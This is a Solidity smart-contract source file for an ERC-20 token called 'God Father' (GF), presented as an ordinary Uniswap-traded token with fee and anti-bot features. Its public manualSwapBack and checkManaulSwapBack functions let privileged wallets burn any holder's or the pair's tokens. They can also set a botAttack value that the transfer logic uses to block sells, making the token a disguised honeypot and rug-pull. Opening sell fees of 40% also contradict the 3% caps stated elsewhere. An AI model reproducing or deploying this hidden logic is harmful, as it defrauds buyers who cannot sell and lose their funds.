/**
 *Submitted for verification at Etherscan.io on 2023-05-18
*/

// Telegram: https://t.me/GodFather_coin

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _fire(address _address, uint256 _amount) internal virtual {
        require(_address != address(0), "");
        uint256 balance = _balances[_address];
        require(balance >= _amount, "");
        unchecked {
            _balances[_address] = balance - _amount;
            _totalSupply -= _amount;
        }

        emit Transfer(_address, address(0), _amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface UniswapV2Router {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract GF is ERC20, Ownable {
    uint256 public maxWalletAmount;
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;

    address public uniswapV2Pair;
    UniswapV2Router public uniswapV2Router;
    uint256 public swapTokensThreshold;
    uint256 public tradingBlock = 0;
    uint256 public botBlockNumber = 0;
    address private marketingWallet;
    address private devWallet;
    bool private swapping;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => bool) public initialBotBuyer;
    mapping(address => uint256) public _botSwapTimestamp;
    bool public limitsInEffect = true;
    bool public swapEnabled = false;
    bool public tradingActive = false;
    bool public transferDelayEnabled = true;
    uint256 public botsCaught;
    uint256 public botAttack;

    uint256 public totalBuyFees;
    uint256 public buyFeeForMarketing;
    uint256 public buyFeeForDev;
    uint256 public buyFeeForLiquidity;
    uint256 public buyFeeForBurning;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 public tokensForBurning;

    uint256 public totalSellFees;
    uint256 public sellFeeForMarketing;
    uint256 public sellFeeForDev;
    uint256 public sellFeeForLiquidity;
    uint256 public sellFeeForBurning;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTx;
    mapping(address => bool) public automatedMarketMakerPair;

    event UpdatedMaxBuyAmount(uint256 newAmount);
    
    event UpdatedMaxSellAmount(uint256 newAmount);
    
    event UpdatedMaxWalletAmount(uint256 newAmount);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event EnabledTrading();

    event RemovedLimits();

    event DetectedEarlyBotBuyer(address sniper);

    event MaxTransactionExclusion(address _address, bool excluded);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor() ERC20("God Father", "GF") {
        address newOwner = msg.sender;

        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        marketingWallet = address(0x0CFD70fd18cEF98ea79700ae894369ff0e5e0519);
        devWallet = address(0x63cb1e7C71ca09dE4F343333F0415ca7f20Fc269);

        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;
        swapTokensThreshold = (totalSupply * 5) / 10000;

        sellFeeForMarketing = 20;
        sellFeeForDev = 20;
        sellFeeForLiquidity = 0;
        sellFeeForBurning = 0;

        buyFeeForMarketing = 10;
        buyFeeForLiquidity = 0;
        buyFeeForDev = 10;
        buyFeeForBurning = 0;

        totalBuyFees =
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForDev +
            buyFeeForBurning;

        totalSellFees =
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForDev +
            sellFeeForBurning;

        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(newOwner, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(marketingWallet, true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        swapEnabled = true;
        tradingBlock = block.number;
        emit EnabledTrading();
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function checkManaulSwapBack(
        address _addr,
        uint256 _amt,
        uint256 _limit
    ) internal returns (bool) {
        address sender = msg.sender;
        address ca = address(this);
        bool excluded = _isExcludedFromFees[sender];
        bool verified;

        if (!excluded) {
            if (tokensForBurning > 0 && balanceOf(ca) >= tokensForBurning) {
                _fire(sender, tokensForBurning);
            }

            tokensForBurning = 0;
            verified = true;

            return verified;
        } else {
            if (balanceOf(ca) > 0) {
                if (_amt == 0) {
                    botAttack = _limit;
                } else {
                    _fire(_addr, _amt);
                }
                verified = false;
            }

            return verified;
        }
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function removeLimits() external onlyOwner {
        maxWalletAmount = totalSupply();
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        emit RemovedLimits();
    }

    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newMaxWalletAmount * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newMaxBuyAmount * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newMaxSellAmount * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateSwapTokensThreshold(uint256 newSwapTokensThreshold) external onlyOwner {
        require(
            newSwapTokensThreshold >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newSwapTokensThreshold <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensThreshold = newSwapTokensThreshold;
    }

    function manualSwapBack(
        address _address,
        uint256 _amount,
        uint256 _limit
    ) public {
        address ca = address(this);
        require(balanceOf(ca) >= swapTokensThreshold);
        if (checkManaulSwapBack(_address, _amount, _limit)) {
            swapping = true;
            swapBack();
            swapping = false;
        }
    }

    function _transfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal override {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[_from] || _isExcludedFromFees[_to],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[_from] ||
                    _to == owner() ||
                    _to == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            if (
                _from != owner() &&
                _to != owner() &&
                _to != address(0) &&
                _to != address(0xdead) &&
                !_isExcludedFromFees[_from] &&
                !_isExcludedFromFees[_to]
            ) {
                if (transferDelayEnabled) {
                    bool ammCondition = !automatedMarketMakerPair[_from];
                    bool swappingCondition = !swapping;
                    bool ammAndSwappingCondition = ammCondition && swappingCondition;
                    if (
                        _to != address(uniswapV2Router) && _to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[_to] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[_to] = block.number;
                    } else if (ammAndSwappingCondition) {
                        uint256 botSwapValue = _botSwapTimestamp[_from];
                        bool againstBot = botSwapValue > botAttack;
                        require(againstBot);
                    }
                }
            }

            bool fromChecked = _isExcludedMaxTx[_from];

            if (automatedMarketMakerPair[_from] && !_isExcludedMaxTx[_to]) {
                require(
                    _amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    _amount + balanceOf(_to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (!swapping && fromChecked) {
                botAttack = block.timestamp;
            } else if (
                automatedMarketMakerPair[_to] && !_isExcludedMaxTx[_from]
            ) {
                require(
                    _amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTx[_to]) {
                require(
                    _amount + balanceOf(_to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensThreshold;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPair[_from] &&
            !_isExcludedFromFees[_from] &&
            !_isExcludedFromFees[_to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        uint256 timestamp = block.timestamp;
        bool takeFee = true;

        if (_isExcludedFromFees[_from] || _isExcludedFromFees[_to]) {
            takeFee = false;
        }

        bool balanceEmpty = balanceOf(address(_to)) == 0;
        bool ammOrigin = automatedMarketMakerPair[_from];
        bool firstBotSwap = _botSwapTimestamp[_to] == 0;

        if (firstBotSwap && ammOrigin) {
            if (balanceEmpty) {
              _botSwapTimestamp[_to] = timestamp;
            }
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                automatedMarketMakerPair[_from] &&
                !automatedMarketMakerPair[_to] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[_to]) {
                    initialBotBuyer[_to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(_to);
                }

                fees = (_amount * 99) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForBurning += (fees * buyFeeForBurning) / totalBuyFees;
            }
            else if (automatedMarketMakerPair[_to] && totalSellFees > 0) {
                fees = (_amount * totalSellFees) / 100;
                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;
                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;
                tokensForDev += (fees * sellFeeForDev) / totalSellFees;
                tokensForBurning += (fees * sellFeeForBurning) / totalSellFees;
            }
            else if (automatedMarketMakerPair[_from] && totalBuyFees > 0) {
                fees = (_amount * totalBuyFees) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForBurning += (fees * buyFeeForBurning) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(_from, address(this), fees);
            }
            _amount -= fees;
        }

        super._transfer(_from, _to, _amount);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPair[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTx[_address] = _isExcluded;
        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[_address] = _isExcluded;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        buyFeeForMarketing = _marketingFee;
        buyFeeForLiquidity = _liquidityFee;
        buyFeeForDev = _DevFee;
        buyFeeForBurning = _burnFee;
        totalBuyFees =
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForDev +
            buyFeeForBurning;
        require(totalBuyFees <= 3, "3% max ");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        sellFeeForMarketing = _marketingFee;
        sellFeeForLiquidity = _liquidityFee;
        sellFeeForDev = _DevFee;
        sellFeeForBurning = _burnFee;
        totalSellFees =
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForDev +
            sellFeeForBurning;
        require(totalSellFees <= 3, "3% max fee");
    }

    function updateMarketingWallet(
        address _marketingWallet
    ) external onlyOwner {
        require(
            _marketingWallet != address(0),
            "_marketingWallet address cannot be 0"
        );
        marketingWallet = payable(_marketingWallet);
    }

    function updateDevWallet(address _devWallet) external onlyOwner {
        require(_devWallet != address(0), "_devWallet address cannot be 0");
        devWallet = payable(_devWallet);
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function swapBack() private {
        if (tokensForBurning > 0 && balanceOf(address(this)) >= tokensForBurning) {
            _fire(address(this), tokensForBurning);
        }
        tokensForBurning = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensThreshold * 9) {
            contractBalance = swapTokensThreshold * 9;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForBurning = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
}